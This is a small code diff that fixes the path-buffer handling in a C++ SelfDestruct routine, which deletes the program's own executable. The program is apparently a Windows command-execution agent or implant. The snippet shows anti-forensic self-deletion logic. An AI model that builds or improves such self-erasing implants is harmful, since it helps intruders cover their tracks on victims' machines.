@@ -90,12 +90,12 @@ LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize)
 void SelfDestruct()
 {
     // get file path, if applicable
-    LPWSTR filePath[MAX_PATH];
-    GetModuleFileName(NULL, *filePath, MAX_PATH);
+    char filePath[MAX_PATH];
+    GetModuleFileName(NULL, filePath, MAX_PATH);
 
     // delete file
     DEBUG_PRINTF("Deleting file: %s\n", filePath);
-    DeleteFile(*filePath);
+    DeleteFile(filePath);
 
     // get process handle
     HANDLE hProcess = GetCurrentProcess();
